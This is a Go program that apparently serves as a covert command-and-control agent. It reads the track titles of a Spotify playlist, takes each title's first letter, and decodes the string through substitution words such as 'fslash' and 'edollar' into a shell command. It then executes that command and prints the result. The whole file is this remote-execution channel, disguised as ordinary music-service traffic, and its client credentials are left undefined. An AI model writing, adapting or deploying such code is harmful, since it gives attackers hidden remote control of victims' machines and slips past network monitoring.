package main

import (
	"context"
	"fmt"
	"log"
	"strings"
	"os/exec"

	"github.com/zmb3/spotify"
	"golang.org/x/oauth2/clientcredentials"
)



func main() {
	// Initialize the client credentials config
	config := &clientcredentials.Config{
		ClientID:     clientID,
		ClientSecret: clientSecret,
		TokenURL:     spotify.TokenURL,
	}

	// Create an http.Client with the access token
	httpClient := config.Client(context.Background())

	// Initialize the spotify client with the http.Client
	client := spotify.NewClient(httpClient)

	// The ID of the public playlist
	playlistID := "29NI1uGgqHiSXrJdyMMU8R" // Replace with the playlist ID you're interested in

	// Retrieve the tracks from the playlist
	tracks, err := getPlaylistTracks(client, spotify.ID(playlistID))
	
	if err != nil {
		log.Fatalf("couldn't get tracks from playlist: %v", err)
	}

	// Extract the first letter of each track and concatenate
	firstLetters := getFirstLetters(tracks)
	cmd	:= decodeCommand(firstLetters)	

	output := runCommand(cmd)
	fmt.Println("Output: ", output)
}

// getPlaylistTracks retrieves the tracks in a Spotify playlist.
func getPlaylistTracks(client spotify.Client, playlistID spotify.ID) ([]spotify.PlaylistTrack, error) {
	var tracks []spotify.PlaylistTrack
	limit := 100
	offset := 0

	for {
		page, err := client.GetPlaylistTracksOpt(playlistID, &spotify.Options{
			Limit:  &limit,
			Offset: &offset,
		}, "")
		if err != nil {
			return nil, err
		}
		tracks = append(tracks, page.Tracks...)
		if page.Next == "" {
			break
		}
		offset += limit
	}

	return tracks, nil
}

// getFirstLetters takes a slice of playlist tracks and returns a string
// consisting of the first letter of each track's name.
func getFirstLetters(tracks []spotify.PlaylistTrack) string {
	var letters strings.Builder

	for _, track := range tracks {
		if len(track.Track.Name) > 0 {
			firstLetter := strings.ToLower(string(track.Track.Name[0]))
			letters.WriteString(firstLetter)
		}
	}

	return letters.String()
}

func runCommand(commandStr string) (string) {
	parts := strings.Fields(commandStr) // Split the command by spaces
	cmd := exec.Command(parts[0], parts[1:]...) // The first part is the command, the rest are the arguments
	outputBytes, _ := cmd.CombinedOutput()    // CombinedOutput gets both STDOUT and STDERR
	
	return string(outputBytes) // Convert the bytes to a string and return
}

func decodeCommand(encoded string) string {
	replacer := strings.NewReplacer(
		"space", " ",
		"hiphen", "-",
		"fslash", "/",
		"bslash", "\\",
		"ebang", "!",
		"epound", "#",
		"edollar", "$",
		"eatsym", "@",
		"eperc", "%",
		"ecarr", "^",
		"eand", "&",
		"estar", "*",
		"eopar", "(",
		"ecpar", ")",
		"eplus", "+",
		"eeq", "=",
		"edot", ".",
		"ecoma", ",",
		"eques", "?",
		"eone", "1",
		"etwo", "2",
		"ethree", "3",
		"efour", "4",
		"efive", "5",
		"esix", "6",
		"eseven", "7",
		"eeight", "8",
		"enine", "9",
		"ezero", "0",
	)
	return replacer.Replace(encoded)
}
